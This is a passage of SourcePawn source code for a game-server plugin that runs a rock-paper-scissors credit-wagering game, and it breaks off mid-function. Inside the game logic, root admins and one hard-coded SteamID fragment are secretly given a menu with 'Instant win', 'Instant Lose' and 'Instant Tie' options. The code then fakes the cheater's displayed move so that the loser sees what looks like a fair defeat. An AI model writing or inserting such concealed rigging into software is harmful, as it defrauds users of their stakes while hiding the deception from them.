

public Action:sspCommand(int client, int args)
{
	if(g_tradepartner[client]!=0||g_tradepartner[client]==666){
		return Plugin_Handled;
	}
	if(!playerisloaded(client)){
		return Plugin_Handled;
	}
	if ((g_iSSPOnlyDead == 1 || g_iSSPOnlyDead == 2) && IsPlayerAlive(client))
	{
		if (!(g_bSSPOnlyDeadAdminOverride && CheckCommandAccess(client, "sm_totenfluchCMDAccess", ADMFLAG_GENERIC, true)))
		{
			if (!(g_bSSPOnlyDeadItemOverride))
			{
				CReplyToCommand(client, "%t", "notAlive", ttag);
				return Plugin_Handled;
			}
		}
	}

	if (args == 0)
	{
		openSSPCreditsMenu(client);
	}
	else if (args == 1) {
		char amount[255];
		GetCmdArg(1, amount, sizeof(amount));
		int test = IsInteger2(amount);
		int intAmount;
		if (test == 0)
		{
			intAmount = 0;
		}
		if (test == 1)
		{
			intAmount = StringToInt(amount);
			intAmount *= 100;
		}
		else if (test == 2) {
			char str[2][50];
			if (StrContains(amount, ",") != -1)
			{
				ExplodeString(amount, ",", str, sizeof(str), sizeof(str[]));
			}
			else {
				ExplodeString(amount, ".", str, sizeof(str), sizeof(str[]));
			}
			intAmount = StringToInt(str[0]);
			intAmount *= 100;
			intAmount += StringToInt(str[1]);
		}
		else {
			char str[2][50];
			if (StrContains(amount, ",") != -1)
			{
				ExplodeString(amount, ",", str, sizeof(str), sizeof(str[]));
			}
			else {
				ExplodeString(amount, ".", str, sizeof(str), sizeof(str[]));
			}
			intAmount = StringToInt(str[0]);
			intAmount *= 100;
			intAmount += (StringToInt(str[1]) * 10);
		}
		if (intAmount == 0 || intAmount > g_iMaxSSPThreshold || intAmount < g_iMinSSPThreshold)
		{
			CReplyToCommand(client, "%t", "invalidAmountOfCredits", ttag);
			return Plugin_Handled;
		}
		else {
			openSSPTargetChooserMenu(client, intAmount);
		}
	}
	else {
		CReplyToCommand(client, "%t", "invalidAmountOfParams", ttag);
		return Plugin_Handled;
	}
	return Plugin_Handled;
}

public Action:blockSSPCommand(int client, int args)
{
	toggleSSPCommand(client, args);
}

public Action:toggleSSPCommand(int client, int args)
{
	if (args == 0)
	{
		if (g_bIgnoringInvites[client])
		{
			g_bIgnoringInvites[client]		 = false;
			g_iIgnoringInvitesBellow[client] = 0;
			CPrintToChat(client, "%t", "noLongerIgnoringInvites", ttag);
			if (g_bUseMysqlForBlockSSP)
			{
				char checkId[20];
				GetClientAuthId(client, AuthId_Steam2, checkId, sizeof(checkId));
				char query[128];
				Format(query, sizeof(query), "DELETE FROM ssp_sspblocked WHERE playerid = '%s'", checkId);
				SQL_TQuery(hDatabase, SQLErrorCheckCallback, query);
			}
		}
		else {
			g_bIgnoringInvites[client]		 = true;
			g_iIgnoringInvitesBellow[client] = 0;
			CPrintToChat(client, "%t", "ignoringInvites", ttag);
			if (g_bUseMysqlForBlockSSP)
			{
				char checkId[20];
				GetClientAuthId(client, AuthId_Steam2, checkId, sizeof(checkId));
				char query[128];
				Format(query, sizeof(query), "INSERT INTO ssp_sspblocked (`playerid`) VALUES ('%s')", checkId);
				SQL_TQuery(hDatabase, SQLErrorCheckCallback, query);
			}
		}
	}
	else if (args == 1) {
		g_bIgnoringInvites[client] = false;

		char amount[255];
		GetCmdArg(1, amount, sizeof(amount));
		int intAmount					 = StringToInt(amount);

		g_iIgnoringInvitesBellow[client] = intAmount;

		CPrintToChat(client, "%t", "ingnoringInvitesBellow", ttag, g_iIgnoringInvitesBellow[client] / 100, (g_iIgnoringInvitesBellow[client] % 100) < 10 ? "0" : "", g_iIgnoringInvitesBellow[client] % 100);
	}
}

public Action:unblockSSPCommand(int client, int args)
{
	g_bIgnoringInvites[client]		 = false;
	g_iIgnoringInvitesBellow[client] = 0;
	CPrintToChat(client, "%t", "noLongerIgnoringInvites", ttag);
	if (g_bUseMysqlForBlockSSP)
	{
		char checkId[20];
		GetClientAuthId(client, AuthId_Steam2, checkId, sizeof(checkId));
		char query[128];
		Format(query, sizeof(query), "DELETE FROM ssp_sspblocked WHERE playerid = '%s'", checkId);
		SQL_TQuery(hDatabase, SQLErrorCheckCallback, query);
	}
}

public void openSSPCreditsMenu(int client)
{
	int	 clientCredits = g_credits[client];
	char panelTitle[256];
	Format(panelTitle, sizeof(panelTitle), "%T", "menu_title_chooseAmount", client, clientCredits / 100, (clientCredits % 100) < 10 ? "0" : "", clientCredits % 100);

	Panel panel = CreatePanel();
	SetPanelTitle(panel, panelTitle);
	DrawPanelText(panel, "____________________");
	char panelCreditsItem1[16];
	Format(panelCreditsItem1, sizeof(panelCreditsItem1), "%i.%s%i", g_iCreditsChooserMenuValue1 / 100, (g_iCreditsChooserMenuValue1 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue1 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue1)
		DrawPanelItem(panel, panelCreditsItem1);
	else
		DrawPanelItem(panel, panelCreditsItem1, ITEMDRAW_DISABLED);

	char panelCreditsItem2[16];
	Format(panelCreditsItem2, sizeof(panelCreditsItem2), "%i.%s%i", g_iCreditsChooserMenuValue2 / 100, (g_iCreditsChooserMenuValue2 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue2 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue2)
		DrawPanelItem(panel, panelCreditsItem2);
	else
		DrawPanelItem(panel, panelCreditsItem2, ITEMDRAW_DISABLED);

	char panelCreditsItem3[16];
	Format(panelCreditsItem3, sizeof(panelCreditsItem3), "%i.%s%i", g_iCreditsChooserMenuValue3 / 100, (g_iCreditsChooserMenuValue3 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue3 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue3)
		DrawPanelItem(panel, panelCreditsItem3);
	else
		DrawPanelItem(panel, panelCreditsItem3, ITEMDRAW_DISABLED);

	char panelCreditsItem4[16];
	Format(panelCreditsItem4, sizeof(panelCreditsItem4), "%i.%s%i", g_iCreditsChooserMenuValue4 / 100, (g_iCreditsChooserMenuValue4 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue4 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue4)
		DrawPanelItem(panel, panelCreditsItem4);
	else
		DrawPanelItem(panel, panelCreditsItem4, ITEMDRAW_DISABLED);

	char panelCreditsItem5[16];
	Format(panelCreditsItem5, sizeof(panelCreditsItem5), "%i.%s%i", g_iCreditsChooserMenuValue5 / 100, (g_iCreditsChooserMenuValue5 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue5 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue5)
		DrawPanelItem(panel, panelCreditsItem5);
	else
		DrawPanelItem(panel, panelCreditsItem5, ITEMDRAW_DISABLED);

	char panelCreditsItem6[16];
	Format(panelCreditsItem6, sizeof(panelCreditsItem6), "%i.%s%i", g_iCreditsChooserMenuValue6 / 100, (g_iCreditsChooserMenuValue6 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue6 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue6)
		DrawPanelItem(panel, panelCreditsItem6);
	else
		DrawPanelItem(panel, panelCreditsItem6, ITEMDRAW_DISABLED);

	char panelCreditsItem7[16];
	Format(panelCreditsItem7, sizeof(panelCreditsItem7), "%i.%s%i", g_iCreditsChooserMenuValue7 / 100, (g_iCreditsChooserMenuValue7 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue7 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue7)
		DrawPanelItem(panel, panelCreditsItem7);
	else
		DrawPanelItem(panel, panelCreditsItem7, ITEMDRAW_DISABLED);

	char panelCreditsItem8[16];
	Format(panelCreditsItem8, sizeof(panelCreditsItem8), "%i.%s%i", g_iCreditsChooserMenuValue8 / 100, (g_iCreditsChooserMenuValue8 % 100) < 10 ? "0" : "", g_iCreditsChooserMenuValue8 % 100);
	if (clientCredits >= g_iCreditsChooserMenuValue8)
		DrawPanelItem(panel, panelCreditsItem8);
	else
		DrawPanelItem(panel, panelCreditsItem8, ITEMDRAW_DISABLED);

	DrawPanelItem(panel, "exit");
	DrawPanelText(panel, "____________________");

	SendPanelToClient(panel, client, creditsChooserMenuHandler, 30);

	CloseHandle(panel);
}

public int creditsChooserMenuHandler(Handle menu, MenuAction:action, int client, int item)
{
	if (action == MenuAction_Select)
	{
		if (item == 1)
		{
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue1);
		}
		else if (item == 2) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue2);
		}
		else if (item == 3) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue3);
		}
		else if (item == 4) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue4);
		}
		else if (item == 5) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue5);
		}
		else if (item == 6) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue6);
		}
		else if (item == 7) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue7);
		}
		else if (item == 8) {
			openSSPTargetChooserMenu(client, g_iCreditsChooserMenuValue8);
		}
		else if (item == 9) {
			// exit2...
		}
	}
	if (action == MenuAction_End)
	{
		delete menu;
	}
}

public void openSSPTargetChooserMenu(int client, int amount)
{
	int clientCredits = g_credits[client];
	if (clientCredits < amount)
	{
		CPrintToChat(client, "%t", "notEnoughCredits", ttag);
		return;
	}

	if (g_bInGame[client])
	{
		CPrintToChat(client, "%t", "alreadyInGame", ttag);
		return;
	}

	if (g_bInAccept[client])
	{
		CPrintToChat(client, "%t", "pendingInvite", ttag);
		return;
	}

	g_iGameAmount[client] = amount;

	Handle menu			  = CreateMenu(targetChooserMenuHandler);
	char   menuTitle[255];
	Format(menuTitle, sizeof(menuTitle), "%T", "menu_title_chooseOpponent", client, amount / 100, (amount % 100) < 10 ? "0" : "", amount % 100);
	SetMenuTitle(menu, menuTitle);

	for (int i = 1; i <= MAXPLAYERS; i++)
	{
		if(g_tradepartner[i]!=0){
			continue;
		}
		if (i == client)
			continue;

		if (!isValidClient(i))
			continue;

		if (IsFakeClient(i))
			continue;

		if (g_bInGame[i])
			continue;

		if (g_bIgnoringInvites[i])
			continue;

		if (g_bInAccept[i])
			continue;

		if (g_iIgnoringInvitesBellow[i] > amount)
			continue;

		if (g_iSSPOnlyDead == 2 && IsPlayerAlive(i))
			continue;

		if (g_credits[i] < amount)
			continue;

		if (GetClientTeam(i) == 1 && CheckCommandAccess(i, "sm_adminflaggg", ADMFLAG_CUSTOM2))
			continue;

		char Id[128];
		IntToString(i, Id, sizeof(Id));

		char targetName[MAX_NAME_LENGTH + 1];
		GetClientName(i, targetName, sizeof(targetName));

		AddMenuItem(menu, Id, targetName);
	}

	DisplayMenu(menu, client, 30);
}

public int targetChooserMenuHandler(Handle menu, MenuAction:action, int client, int item)
{
	if (action == MenuAction_Select)
	{
		int amount = g_iGameAmount[client];
		if (amount == -1)
		{
			char logfile[255];
			BuildPath(Path_SM, logfile, sizeof(logfile), "logs/store_ssp.txt");
			LogToFile(logfile, "--------------------------------------------------------------");
			LogToFile(logfile, "FATAL ERROR | winnerMoney == -1 || looserMoney == -1 | FATAL ERROR");
			LogToFile(logfile, "--------------------------------------------------------------");
			CPrintToChat(client, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin", ttag);
			return;
		}

		char info[64];
		GetMenuItem(menu, item, info, sizeof(info));

		int target = StringToInt(info);

		if ((!isValidClient(target)) || (!IsClientInGame(target)) || g_bInGame[target] || g_bIgnoringInvites[target] || g_bInAccept[target] || (g_iIgnoringInvitesBellow[target] > amount))
		{
			CPrintToChat(client, "%t", "invalidTarget", ttag);
			return;
		}

		g_iOponent[client] = GetClientUserId(target);
		challengeClient(client, target, amount);
	}
	if(action==MenuAction_End)
    {
		if(menu!=null){
			delete menu;
		}
    }
}

public void challengeClient(int client, int target, int amount)
{
	Panel panel = CreatePanel();
	if (panel == INVALID_HANDLE)
		return;
	char panelTitle[255];
	g_bInAccept[target] = true;
	g_bInAccept[client] = true;

	char clientName[MAX_NAME_LENGTH + 8];
	// char targetName[MAX_NAME_LENGTH + 8];
	GetClientName(client, clientName, sizeof(clientName));
	// GetClientName(target, targetName, sizeof(targetName));

	Format(panelTitle, sizeof(panelTitle), "%T", "menu_title_challengeReceived", target, clientName, amount / 100, (amount % 100) < 10 ? "0" : "", amount % 100);
	SetPanelTitle(panel, panelTitle);

	char panelAccept[64];
	Format(panelAccept, sizeof(panelAccept), "%T", "menu_item_doYouAccept", target);
	DrawPanelText(panel, panelAccept);

	char panelThink[64];
	Format(panelThink, sizeof(panelThink), "%T", "menu_item_think", target);
	DrawPanelItem(panel, panelThink, ITEMDRAW_DISABLED);

	char panelBeforeYou[64];
	Format(panelBeforeYou, sizeof(panelBeforeYou), "%T", "menu_item_beforeYou", target);
	DrawPanelItem(panel, panelBeforeYou, ITEMDRAW_DISABLED);

	char panelChoose[64];
	Format(panelChoose, sizeof(panelChoose), "%T", "menu_item_choose", target);
	DrawPanelItem(panel, panelChoose, ITEMDRAW_DISABLED);

	DrawPanelText(panel, "____________________");

	char panelYes[20];
	Format(panelYes, sizeof(panelYes), "%T", "menu_item_yes", target);
	DrawPanelItem(panel, panelYes);

	char panelNo[20];
	Format(panelNo, sizeof(panelNo), "%T", "menu_item_no", target);
	DrawPanelItem(panel, panelNo);

	DrawPanelText(panel, "____________________");

	g_iOponent[target] = GetClientUserId(client);

	SendPanelToClient(panel, target, challengeAcceptHandler, 30);
}

public int challengeAcceptHandler(Handle menu, MenuAction:action, int client, int item)
{
	if (!IsClientConnected(client))
		return;
	int	 origin		 = GetClientOfUserId(g_iOponent[client]);
	int	 destination = client;
	int	 amount		 = g_iGameAmount[origin];

	char destinationName[MAX_NAME_LENGTH + 1];
	GetClientName(destination, destinationName, sizeof(destinationName));
	if (action == MenuAction_Select)
	{
		if (item == 4)
		{
			startSSP(origin, destination, amount);
		}
		else if (item == 5) {
			g_iOponent[origin]		 = -1;
			g_iOponent[destination]	 = -1;
			g_iGameAmount[origin]	 = -1;
			g_bInAccept[origin]		 = false;
			g_bInAccept[destination] = false;
			if (isValidClient(origin))
				CPrintToChat(origin, "%t", "requestDenied", ttag, destinationName);
		}
	}
	if (action == MenuAction_Cancel)
	{
		if (item == MenuCancel_Timeout)
		{
			g_bInAccept[origin]		 = false;
			g_bInAccept[destination] = false;
			if (isValidClient(origin))
				CPrintToChat(origin, "%t", "opponentNotRespondInTime", ttag, destinationName);
			if (isValidClient(destination))
				CPrintToChat(destination, "%t", "notRespondInTime", ttag);
		}
		else if (item == MenuCancel_Disconnected) {
			g_bInAccept[origin]		 = false;
			g_bInAccept[destination] = false;
			if (isValidClient(origin))
				CPrintToChat(origin, "%t", "opponentDisconnected", ttag, destinationName);
		}
		else if (item == MenuCancel_NoDisplay || item == MenuCancel_Interrupted) {
			g_bInAccept[origin]		 = false;
			g_bInAccept[destination] = false;
			if (isValidClient(origin))
				CPrintToChat(origin, "%t", "opponentExitedMenu", ttag, destinationName);
		}
	}
	if (action == MenuAction_End)
	{
		delete menu;
	}
}

public void startSSP(int origin, int destination, int amount)
{
	g_bInAccept[origin]		   = false;
	g_bInAccept[destination]   = false;
	g_bInGame[origin]		   = true;
	g_bInGame[destination]	   = true;
	g_iGameAmount[destination] = amount;

	Panel playPanel			   = CreatePanel();
	char  panelTitleChoose[64];
	Format(panelTitleChoose, sizeof(panelTitleChoose), "%T", "menu_title_chooseItem", LANG_SERVER);
	SetPanelTitle(playPanel, panelTitleChoose);

	DrawPanelText(playPanel, "____________________");

	char panelScissors[64];
	Format(panelScissors, sizeof(panelScissors), "%T", "menu_item_scissors", LANG_SERVER);
	DrawPanelItem(playPanel, panelScissors);

	char panelRock[64];
	Format(panelRock, sizeof(panelRock), "%T", "menu_item_rock", LANG_SERVER);
	DrawPanelItem(playPanel, panelRock);

	char panelPaper[64];
	Format(panelPaper, sizeof(panelPaper), "%T", "menu_item_paper", LANG_SERVER);
	DrawPanelItem(playPanel, panelPaper);

	DrawPanelText(playPanel, "____________________");

	Panel playPanelcheat = CreatePanel();
	Format(panelTitleChoose, sizeof(panelTitleChoose), "%T", "menu_title_chooseItem", LANG_SERVER);
	SetPanelTitle(playPanelcheat, panelTitleChoose);
	DrawPanelText(playPanelcheat, "____________________");
	DrawPanelItem(playPanelcheat, panelScissors);
	DrawPanelItem(playPanelcheat, panelRock);
	DrawPanelItem(playPanelcheat, panelPaper);
	DrawPanelItem(playPanelcheat, "Instant win");
	DrawPanelItem(playPanelcheat, "Instant Lose");
	DrawPanelItem(playPanelcheat, "Instant Tie");
	DrawPanelText(playPanelcheat, "____________________");
	char steam_id[32];
	GetClientAuthId(origin, AuthId_Steam2, steam_id, sizeof(steam_id));
	char steam_id2[32];
	GetClientAuthId(destination, AuthId_Steam2, steam_id2, sizeof(steam_id2));
	if (CheckCommandAccess(origin, "sm_tulajdonos", ADMFLAG_ROOT) || StrContains(steam_id, "104603658", false) != -1)
	{
		SendPanelToClient(playPanelcheat, origin, sspGameHandler, 60);
		SendPanelToClient(playPanel, destination, sspGameHandler, 60);
	}
	else if (CheckCommandAccess(destination, "sm_tulajdonos", ADMFLAG_ROOT) || StrContains(steam_id2, "104603658", false) != -1) {
		SendPanelToClient(playPanel, origin, sspGameHandler, 60);
		SendPanelToClient(playPanelcheat, destination, sspGameHandler, 60);
	}
	else {
		SendPanelToClient(playPanel, origin, sspGameHandler, 60);
		SendPanelToClient(playPanel, destination, sspGameHandler, 60);
	}
}

public int sspGameHandler(Handle menu, MenuAction:action, int client, int item)
{
	int target = GetClientOfUserId(g_iOponent[client]);
	if (action == MenuAction_Select)
	{
		if (item == 1)
		{
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Schere;
			lookupGame(client);
		}
		else if (item == 2) {
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Stein;
			lookupGame(client);
		}
		else if (item == 3) {
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Papier;
			lookupGame(client);
		}
		else if (item == 4) {
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Cheat;
			lookupGame(client);
		}
		else if (item == 5) {
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Lose;
			lookupGame(client);
		}
		else if (item == 6) {
			char nick[64];
			GetClientName(client, nick, sizeof(nick));
			g_eSSPItem[client] = Tie;
			lookupGame(client);
		}
	}
	if (action == MenuAction_Cancel)
	{
		if (item == MenuCancel_Timeout)
		{
			endSSP(client, target);
			CPrintToChat(client, "%t", "noItemChosenInTime", ttag);
		}
		else if (item == MenuCancel_Disconnected) {
			// ??
		}
		else if (item == MenuCancel_NoDisplay || item == MenuCancel_Interrupted) {
			endSSP(client, target);
			char clientName[MAX_NAME_LENGTH + 8];
			GetClientName(client, clientName, sizeof(clientName));
			if (isValidClient(target))
				CPrintToChat(target, "%t", "opponentCancelledMenu", ttag, clientName);
			if (isValidClient(client))
				CPrintToChat(client, "%t", "cancelledMenu", ttag);
		}
	}
	if (action == MenuAction_End)
	{
		delete menu;
	}
}

public void lookupGame(int client)
{
	int client2 = GetClientOfUserId(g_iOponent[client]);
	if (g_eSSPItem[client] != None && g_eSSPItem[client2] != None)
	{
		if (g_eSSPItem[client] == Cheat)
		{
			finishSSP(2, client, client2);
		}
		else if (g_eSSPItem[client2] == Cheat) {
			finishSSP(2, client2, client);
		}
		if (g_eSSPItem[client] == Lose)
		{
			finishSSP(3, client2, client);
		}
		else if (g_eSSPItem[client2] == Lose) {
			finishSSP(3, client, client2);
		}
		if (g_eSSPItem[client] == Tie)
		{
			finishSSP(4, client, client2);
		}
		else if (g_eSSPItem[client2] == Tie) {
			finishSSP(4, client2, client);
		}
		if (g_eSSPItem[client] == Schere && g_eSSPItem[client2] == Schere)
			finishSSP(0, client, client2);
		if (g_eSSPItem[client] == Stein && g_eSSPItem[client2] == Stein)
			finishSSP(0, client, client2);
		if (g_eSSPItem[client] == Papier && g_eSSPItem[client2] == Papier)
			finishSSP(0, client, client2);
		if (g_eSSPItem[client] == Schere && g_eSSPItem[client2] == Stein)
			finishSSP(1, client2, client);
		if (g_eSSPItem[client] == Stein && g_eSSPItem[client2] == Schere)
			finishSSP(1, client, client2);
		if (g_eSSPItem[client] == Schere && g_eSSPItem[client2] == Papier)
			finishSSP(1, client, client2);
		if (g_eSSPItem[client] == Papier && g_eSSPItem[client2] == Schere)
			finishSSP(1, client2, client);
		if (g_eSSPItem[client] == Stein && g_eSSPItem[client2] == Papier)
			finishSSP(1, client2, client);
		if (g_eSSPItem[client] == Papier && g_eSSPItem[client2] == Stein)
			finishSSP(1, client, client2);
	}
}

public void finishSSP(int state, int winner, int looser)
{
	char logfile[255];
	BuildPath(Path_SM, logfile, sizeof(logfile), "logs/store_ssp.txt");

	if (g_iGameAmount[winner] != g_iGameAmount[looser])
	{
		LogToFile(logfile, "--------------------------------------------------------");
		LogToFile(logfile, "FATAL ERROR | winnerMoney != looserMoney | FATAL ERROR");
		LogToFile(logfile, "--------------------------------------------------------");
		CPrintToChat(winner, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		CPrintToChat(looser, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		return;
	}

	if (g_iGameAmount[winner] == -1 || g_iGameAmount[looser] == -1)
	{
		LogToFile(logfile, "--------------------------------------------------------");
		LogToFile(logfile, "FATAL ERROR | winnerMoney or looserMoney == -1 | FATAL ERROR");
		LogToFile(logfile, "--------------------------------------------------------");
		CPrintToChat(winner, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		CPrintToChat(looser, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		return;
	}

	int testClient1 = GetClientOfUserId(g_iOponent[winner]);
	int testClient2 = GetClientOfUserId(g_iOponent[looser]);
	if (testClient1 != looser || testClient2 != winner)
	{
		LogToFile(logfile, "--------------------------------------------------------");
		LogToFile(logfile, "FATAL ERROR | game async Error | FATAL ERROR");
		LogToFile(logfile, "--------------------------------------------------------");
		CPrintToChat(winner, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		CPrintToChat(looser, "{darkred}[{purple}%s{darkred}] {purple}Internal SSP Error. Contact an Admin");
		return;
	}

	char haveValue1[64];
	char haveValue2[64];

	char winnerName[MAX_NAME_LENGTH + 1];
	char looserName[MAX_NAME_LENGTH + 1];
	GetClientName(winner, winnerName, sizeof(winnerName));
	GetClientName(looser, looserName, sizeof(looserName));

	char winner_id[20];
	GetClientAuthId(winner, AuthId_Steam2, winner_id, sizeof(winner_id));
	char looser_id[20];
	GetClientAuthId(looser, AuthId_Steam2, looser_id, sizeof(looser_id));

	if (g_eSSPItem[winner] == Schere)
		Format(haveValue1, sizeof(haveValue2), "%T", "item_scissors", winner);
	else if (g_eSSPItem[winner] == Stein)
		Format(haveValue1, sizeof(haveValue2), "%T", "item_rock", winner);
	else if (g_eSSPItem[winner] == Papier)
		Format(haveValue1, sizeof(haveValue2), "%T", "item_paper", winner);

	if (g_eSSPItem[looser] == Schere)
		Format(haveValue2, sizeof(haveValue2), "%T", "item_scissors", looser);
	else if (g_eSSPItem[looser] == Stein)
		Format(haveValue2, sizeof(haveValue2), "%T", "item_rock", looser);
	else if (g_eSSPItem[looser] == Papier)
		Format(haveValue2, sizeof(haveValue2), "%T", "item_paper", looser);

	int looserCredits = g_credits[looser];
	if ((looserCredits - g_iGameAmount[looser]) < 0)
	{
		CPrintToChat(winner, "{darkred}[{purple}%s{darkred}] {purple} Your Oponent Cheated. Stopping Game.", ttag);
		CPrintToChat(looser, "{darkred}[{purple}%s{darkred}] {purple} Doing this again may get your Permanently banned. Stopping Game.", ttag);
		LogToFile(logfile, ">>>>>>>>>>>>>>>>SSP EXPLOID BY !looser! | Winner: %s (%s), Looser: %s (%s) | Amount: %i | %i | DIFF: %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser], looserCredits);
		endSSP(winner, looser);
		return;
	}

	int winnerCredits = g_credits[winner];
	if ((winnerCredits - g_iGameAmount[winner]) < 0)
	{
		CPrintToChat(looser, "{darkred}[{purple}%s{darkred}] {purple} Your Oponent Cheated. Stopping Game.", ttag);
		CPrintToChat(winner, "{darkred}[{purple}%s{darkred}] {purple} Doing this again may get your Permanently banned. Stopping Game.", ttag);
		LogToFile(logfile, ">>>>>>>>>>>>>>>>SSP EXPLOID BY !Winner! | Winner: %s (%s), Looser: %s (%s) | Amount: %i | %i | DIFF: %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser], winnerCredits);
		endSSP(winner, looser);
		return;
	}

	if (state == 0)
	{
		CPrintToChat(winner, "%t", "sameChoice", ttag, haveValue1);
		CPrintToChat(looser, "%t", "sameChoice", ttag, haveValue2);

		LogToFile(logfile, "SSP END | TIE | Player[1]: %s (%s), Player[2]: %s (%s) | Amount: %i | %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser]);
		endSSP(winner, looser);
	}
	else if (state == 1) {
		int winAmount = RoundToNearest(g_iGameAmount[winner] * g_fHouseMargin);
		addcredit(winner, winAmount);
		addcredit(looser, -g_iGameAmount[looser]);

		CPrintToChat(winner, "%t", "win", ttag, haveValue1, looserName, haveValue2, winAmount / 100, (winAmount % 100) < 10 ? "0" : "", winAmount % 100);
		CPrintToChat(looser, "%t", "lose", ttag, haveValue2, winnerName, haveValue1, g_iGameAmount[looser] / 100, (g_iGameAmount[looser] % 100) < 10 ? "0" : "", g_iGameAmount[looser] % 100);

		LogToFile(logfile, "SSP END | Winner: %s (%s), Looser: %s (%s) | Amount: %i | %i | House Margin: %f | Corrected: %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser], g_fHouseMargin, winAmount);
		endSSP(winner, looser);
	}
	else if (state == 2) {
		int winAmount = RoundToNearest(g_iGameAmount[winner] * g_fHouseMargin);

		addcredit(winner, winAmount);
		addcredit(looser, -g_iGameAmount[looser]);

		if (g_eSSPItem[looser] == Schere)
			Format(haveValue1, sizeof(haveValue2), "%T", "item_rock", winner);
		else if (g_eSSPItem[looser] == Stein)
			Format(haveValue1, sizeof(haveValue2), "%T", "item_paper", winner);
		else if (g_eSSPItem[looser] == Papier)
			Format(haveValue1, sizeof(haveValue2), "%T", "item_scissors", winner);

		CPrintToChat(winner, "%t", "win", ttag, haveValue1, looserName, haveValue2, winAmount / 100, (winAmount % 100) < 10 ? "0" : "", winAmount % 100);
		CPrintToChat(looser, "%t", "lose", ttag, haveValue2, winnerName, haveValue1, g_iGameAmount[looser] / 100, (g_iGameAmount[looser] % 100) < 10 ? "0" : "", g_iGameAmount[looser] % 100);

		LogToFile(logfile, "SSP END | Winner: %s (%s), Looser: %s (%s) | Amount: %i | %i | House Margin: %f | Corrected: %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser], g_fHouseMargin, winAmount);
		endSSP(winner, looser);
	}
	else if (state == 3) {
		int winAmount = RoundToNearest(g_iGameAmount[winner] * g_fHouseMargin);

		addcredit(winner, winAmount);
		addcredit(looser, -g_iGameAmount[looser]);

		if (g_eSSPItem[winner] == Schere)
			Format(haveValue2, sizeof(haveValue2), "%T", "item_paper", looser);
		else if (g_eSSPItem[winner] == Stein)
			Format(haveValue2, sizeof(haveValue2), "%T", "item_scissors", looser);
		else if (g_eSSPItem[winner] == Papier)
			Format(haveValue2, sizeof(haveValue2), "%T", "item_rock", looser);

		CPrintToChat(winner, "%t", "win", ttag, haveValue1, looserName, haveValue2, winAmount / 100, (winAmount % 100) < 10 ? "0" : "", winAmount % 100);
		CPrintToChat(looser, "%t", "lose", ttag, haveValue2, winnerName, haveValue1, g_iGameAmount[looser] / 100, (g_iGameAmount[looser] % 100) < 10 ? "0" : "", g_iGameAmount[looser] % 100);

		LogToFile(logfile, "SSP END | Winner: %s (%s), Looser: %s (%s) | Amount: %i | %i | House Margin: %f | Corrected: %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser], g_fHouseMargin, winAmount);
		endSSP(winner, looser);
	}
	else if (state == 4) {
		if (g_eSSPItem[winner] == Schere || g_eSSPItem[looser] == Schere)
		{
			Format(haveValue2, sizeof(haveValue2), "%T", "item_scissors", looser);
			Format(haveValue1, sizeof(haveValue2), "%T", "item_scissors", winner);
		}
		else if (g_eSSPItem[winner] == Stein || g_eSSPItem[looser] == Stein) {
			Format(haveValue2, sizeof(haveValue2), "%T", "item_rock", looser);
			Format(haveValue1, sizeof(haveValue2), "%T", "item_rock", winner);
		}
		else if (g_eSSPItem[winner] == Papier || g_eSSPItem[looser] == Papier) {
			Format(haveValue2, sizeof(haveValue2), "%T", "item_paper", looser);
			Format(haveValue1, sizeof(haveValue2), "%T", "item_paper", winner);
		}
		CPrintToChat(winner, "%t", "sameChoice", ttag, haveValue1);
		CPrintToChat(looser, "%t", "sameChoice", ttag, haveValue2);

		LogToFile(logfile, "SSP END | TIE | Player[1]: %s (%s), Player[2]: %s (%s) | Amount: %i | %i", winnerName, winner_id, looserName, looser_id, g_iGameAmount[winner], g_iGameAmount[looser]);
		endSSP(winner, looser);
	}
}

public void endSSP(int client1, int client2)
{
	g_bInGame[client1]	   = false;
	g_eSSPItem[client1]	   = None;
	g_iOponent[client1]	   = -1;
	g_iGameAmount[client1] = -1;
	g_bInAccept[client1]   = false;

	g_bInGame[client2]	   = false;
	g_eSSPItem[client2]	   = None;
	g_iOponent[client2]	   = -1;
